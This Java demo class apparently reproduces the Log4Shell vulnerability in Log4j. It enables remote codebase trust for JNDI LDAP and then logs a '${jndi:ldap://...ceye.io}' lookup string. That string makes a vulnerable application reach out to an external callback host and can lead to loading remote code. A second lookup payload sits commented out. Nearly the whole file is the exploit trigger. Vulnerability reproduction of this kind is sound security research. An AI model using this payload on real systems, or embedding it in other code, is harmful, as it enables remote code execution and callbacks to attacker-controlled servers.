package Servlet.demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
class log4j {
    public static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {

        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:ldap://85p4wv.ceye.io}");

//        logger.error("${java:data}");
    }
}